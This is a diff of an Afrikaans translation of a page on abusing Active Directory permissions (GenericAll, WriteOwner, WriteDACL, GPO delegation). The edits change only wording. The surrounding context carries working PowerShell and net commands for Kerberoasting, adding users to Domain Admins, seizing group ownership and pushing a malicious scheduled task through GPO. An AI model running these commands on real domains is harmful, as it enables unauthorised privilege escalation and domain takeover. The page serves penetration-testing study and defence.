@@ -6,9 +6,9 @@
 
 ## **GenericAll Regte op Gebruiker**
 
-Hierdie voorreg bied 'n aanvaller volle beheer oor 'n teiken gebruikersrekening. Sodra `GenericAll` regte bevestig is met die `Get-ObjectAcl` opdrag, kan 'n aanvaller:
+Hierdie voorreg verleen 'n aanvaller volle beheer oor 'n teiken gebruikersrekening. Sodra `GenericAll` regte bevestig is met die `Get-ObjectAcl` opdrag, kan 'n aanvaller:
 
-- **Verander die Teiken se Wagwoord**: Met `net user <username> <password> /domain`, kan die aanvaller die gebruiker se wagwoord reset.
+- **Verander die Teiken se Wagwoord**: Met `net user <username> <password> /domain` kan die aanvaller die gebruiker se wagwoord reset.
 - **Teiken Kerberoasting**: Ken 'n SPN aan die gebruiker se rekening toe om dit kerberoastable te maak, en gebruik dan Rubeus en targetedKerberoast.py om die ticket-granting ticket (TGT) hashes te onttrek en te probeer kraak.
 ```powershell
 Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
@@ -31,16 +31,16 @@ Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.
 ```
 ## **GenericAll / GenericWrite / Write on Computer/User**
 
-Die hou van hierdie voorregte op 'n rekenaarobjek of 'n gebruikersrekening stel in staat tot:
+Die hou van hierdie regte op 'n rekenaar objek of 'n gebruikersrekening stel in staat tot:
 
-- **Kerberos Resource-based Constrained Delegation**: Maak dit moontlik om 'n rekenaarobjek oor te neem.
-- **Shadow Credentials**: Gebruik hierdie tegniek om 'n rekenaar of gebruikersrekening na te boots deur die voorregte te benut om skadu-akkrediteer te skep.
+- **Kerberos Resource-based Constrained Delegation**: Maak dit moontlik om 'n rekenaar objek oor te neem.
+- **Shadow Credentials**: Gebruik hierdie tegniek om 'n rekenaar of gebruikersrekening na te volg deur die regte te benut om skadu kredensiale te skep.
 
 ## **WriteProperty on Group**
 
 As 'n gebruiker `WriteProperty` regte op alle objekte vir 'n spesifieke groep (bv. `Domain Admins`) het, kan hulle:
 
-- **Hulself by die Domain Admins Groep Voeg**: Bereikbaar deur `net user` en `Add-NetGroupUser` opdragte te kombineer, maak hierdie metode voorregte-eskalasie binne die domein moontlik.
+- **Hulself by die Domain Admins Groep Voeg**: Bereikbaar deur `net user` en `Add-NetGroupUser` opdragte te kombineer, maak hierdie metode regte eskalasie binne die domein moontlik.
 ```powershell
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
@@ -52,7 +52,7 @@ net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domai
 ```
 ## **WriteProperty (Self-Membership)**
 
-'n Soortgelyke voorreg, dit stel aanvallers in staat om hulself direk by groepe te voeg deur groep eienskappe te wysig as hulle die `WriteProperty` reg op daardie groepe het. Die bevestiging en uitvoering van hierdie voorreg word uitgevoer met:
+'n Soortgelyke voorreg, dit laat aanvallers toe om hulself direk by groepe te voeg deur groep eienskappe te wysig as hulle die `WriteProperty` reg op daardie groepe het. Die bevestiging en uitvoering van hierdie voorreg word uitgevoer met:
 ```powershell
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 net group "domain admins" spotless /add /domain
@@ -72,7 +72,7 @@ rpcclient -U KnownUsername 10.10.10.192
 ```
 ## **WriteOwner op Groep**
 
-As 'n aanvaller vind dat hulle `WriteOwner` regte oor 'n groep het, kan hulle die eienaarskap van die groep na hulself verander. Dit is veral impakvol wanneer die groep in vraag `Domain Admins` is, aangesien die verandering van eienaarskap breër beheer oor groepsattributen en lidmaatskap toelaat. Die proses behels die identifisering van die korrekte objek via `Get-ObjectAcl` en dan die gebruik van `Set-DomainObjectOwner` om die eienaar te wysig, hetsy deur SID of naam.
+As 'n aanvaller vind dat hulle `WriteOwner` regte oor 'n groep het, kan hulle die eienaarskap van die groep na hulself verander. Dit is veral impakvol wanneer die groep in vraag `Domain Admins` is, aangesien die verandering van eienaarskap breër beheer oor groepattributen en lidmaatskap toelaat. Die proses behels die identifisering van die korrekte objek via `Get-ObjectAcl` en dan die gebruik van `Set-DomainObjectOwner` om die eienaar te wysig, hetsy deur SID of naam.
 ```powershell
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
@@ -96,7 +96,7 @@ Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'use
 ```
 ## **WriteDACL + WriteOwner**
 
-Om 'n AD objek te besit en `WriteDACL` regte daarop te hê, stel 'n aanvaller in staat om vir hulself `GenericAll` regte oor die objek toe te ken. Dit word bereik deur ADSI-manipulasie, wat volle beheer oor die objek toelaat en die vermoë om sy groep lidmaatskappe te wysig. Ten spyte hiervan, bestaan daar beperkings wanneer daar probeer word om hierdie regte te benut met die Active Directory module se `Set-Acl` / `Get-Acl` cmdlets.
+Die besit van 'n AD objek en die hê van `WriteDACL` regte daarop stel 'n aanvaller in staat om vir hulself `GenericAll` regte oor die objek toe te ken. Dit word bereik deur ADSI manipulasie, wat volle beheer oor die objek toelaat en die vermoë om sy groep lidmaatskappe te wysig. Ten spyte hiervan, bestaan daar beperkings wanneer daar probeer word om hierdie regte te benut met die Active Directory module se `Set-Acl` / `Get-Acl` cmdlets.
 ```powershell
 $ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
 $IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
@@ -106,27 +106,27 @@ $ADSI.psbase.commitchanges()
 ```
 ## **Replika op die Domein (DCSync)**
 
-Die DCSync-aanval benut spesifieke replika-permissies op die domein om 'n Domeinbeheerder na te boots en data te sinkroniseer, insluitend gebruikersbewyse. Hierdie kragtige tegniek vereis permissies soos `DS-Replication-Get-Changes`, wat aanvallers in staat stel om sensitiewe inligting uit die AD-omgewing te onttrek sonder direkte toegang tot 'n Domeinbeheerder. [**Leer meer oor die DCSync-aanval hier.**](../dcsync.md)
+Die DCSync-aanval benut spesifieke replika-regte op die domein om 'n Domeinbeheerder na te boots en data te sinkroniseer, insluitend gebruikersbewyse. Hierdie kragtige tegniek vereis regte soos `DS-Replication-Get-Changes`, wat aanvallers in staat stel om sensitiewe inligting uit die AD-omgewing te onttrek sonder direkte toegang tot 'n Domeinbeheerder. [**Leer meer oor die DCSync-aanval hier.**](../dcsync.md)
 
 ## GPO-delegasie <a href="#gpo-delegation" id="gpo-delegation"></a>
 
 ### GPO-delegasie
 
-Gedelegeerde toegang om Groep Beleidsobjekte (GPO's) te bestuur kan beduidende sekuriteitsrisiko's inhou. Byvoorbeeld, as 'n gebruiker soos `offense\spotless` GPO-bestuursregte gedelegeer word, kan hulle voorregte hê soos **WriteProperty**, **WriteDacl**, en **WriteOwner**. Hierdie permissies kan misbruik word vir kwaadwillige doeleindes, soos geïdentifiseer met PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
+Gedelegeerde toegang om Groep Beleidsobjekte (GPO's) te bestuur kan beduidende sekuriteitsrisiko's inhou. Byvoorbeeld, as 'n gebruiker soos `offense\spotless` GPO-bestuursregte gedelegeer word, kan hulle regte hê soos **WriteProperty**, **WriteDacl**, en **WriteOwner**. Hierdie regte kan misbruik word vir kwaadwillige doeleindes, soos geïdentifiseer met PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
 
-### GPO-permissies op te som
+### GPO-regte op te som
 
-Om verkeerd geconfigureerde GPO's te identifiseer, kan PowerSploit se cmdlets saamgeketting word. Dit stel die ontdekking van GPO's wat 'n spesifieke gebruiker die regte het om te bestuur, moontlik: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
+Om verkeerd geconfigureerde GPO's te identifiseer, kan PowerSploit se cmdlets saamgeketting word. Dit stel in staat om GPO's te ontdek waarvoor 'n spesifieke gebruiker regte het om te bestuur: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
 
-**Rekenaars met 'n Gegewe Beleid Toegepas**: Dit is moontlik om te bepaal watter rekenaars 'n spesifieke GPO toegepas het, wat help om die omvang van potensiële impak te verstaan. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`
+**Rekenaars met 'n Gegewe Beleid Toegepas**: Dit is moontlik om te bepaal watter rekenaars 'n spesifieke GPO toegepas is, wat help om die omvang van potensiële impak te verstaan. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`
 
 **Beleide Toegepas op 'n Gegewe Rekenaar**: Om te sien watter beleide op 'n spesifieke rekenaar toegepas is, kan opdragte soos `Get-DomainGPO` gebruik word.
 
-**OUs met 'n Gegewe Beleid Toegepas**: Om organisatoriese eenhede (OUs) wat deur 'n gegewe beleid geraak word, te identifiseer, kan `Get-DomainOU` gebruik word.
+**OUs met 'n Gegewe Beleid Toegepas**: Om organisatoriese eenhede (OUs) te identifiseer wat deur 'n gegewe beleid geraak word, kan `Get-DomainOU` gebruik word.
 
 ### Misbruik GPO - New-GPOImmediateTask
 
-Verkeerd geconfigureerde GPO's kan benut word om kode uit te voer, byvoorbeeld, deur 'n onmiddellike geskeduleerde taak te skep. Dit kan gedoen word om 'n gebruiker by die plaaslike administrateursgroep op geraakte masjiene te voeg, wat voorregte aansienlik verhoog:
+Verkeerd geconfigureerde GPO's kan benut word om kode uit te voer, byvoorbeeld, deur 'n onmiddellike geskeduleerde taak te skep. Dit kan gedoen word om 'n gebruiker by die plaaslike administrateursgroep op geraakte masjiene te voeg, wat regte beduidend verhoog:
 ```powershell
 New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
 ```
@@ -155,11 +155,11 @@ Die struktuur van die taak, soos getoon in die XML-konfigurasie lêer wat deur `
 
 ### Users and Groups
 
-GPO's laat ook die manipulasie van gebruikers- en groep lidmaatskappe op teikenstelsels toe. Deur die Gebruikers- en Groep beleid lêers direk te redigeer, kan aanvallers gebruikers aan bevoorregte groepe, soos die plaaslike `administrators` groep, toevoeg. Dit is moontlik deur die delegasie van GPO bestuur toestemming, wat die wysiging van beleids lêers toelaat om nuwe gebruikers in te sluit of groep lidmaatskappe te verander.
+GPO's laat ook die manipulasie van gebruikers- en groep lidmaatskappe op teikenstelsels toe. Deur die Gebruikers- en Groep beleidslêers direk te redigeer, kan aanvallers gebruikers aan bevoorregte groepe, soos die plaaslike `administrators` groep, toevoeg. Dit is moontlik deur die delegasie van GPO bestuur toestemming, wat die wysiging van beleidslêers toelaat om nuwe gebruikers in te sluit of groep lidmaatskappe te verander.
 
 Die XML-konfigurasie lêer vir Gebruikers en Groepe skets hoe hierdie veranderinge geïmplementeer word. Deur inskrywings aan hierdie lêer toe te voeg, kan spesifieke gebruikers verhoogde bevoegdhede oor geraakte stelsels verleen word. Hierdie metode bied 'n direkte benadering tot bevoegdheid verhoging deur GPO manipulasie.
 
-Verder kan addisionele metodes vir die uitvoering van kode of die handhawing van volharding, soos die benutting van aanmeld/afmeld skripte, die wysiging van register sleutels vir autoruns, die installering van sagteware via .msi lêers, of die redigering van diens konfigurasies, ook oorweeg word. Hierdie tegnieke bied verskeie roetes om toegang te handhaaf en teikenstelsels te beheer deur die misbruik van GPO's.
+Verder kan addisionele metodes vir die uitvoering van kode of die handhawing van volharding, soos die benutting van aanmeld/afmeld skripte, die wysiging van registriesleutels vir autoruns, die installering van sagteware via .msi lêers, of die redigering van dienskonfigurasies, ook oorweeg word. Hierdie tegnieke bied verskeie roetes om toegang te handhaaf en teikenstelsels te beheer deur die misbruik van GPO's.
 
 ## References
 
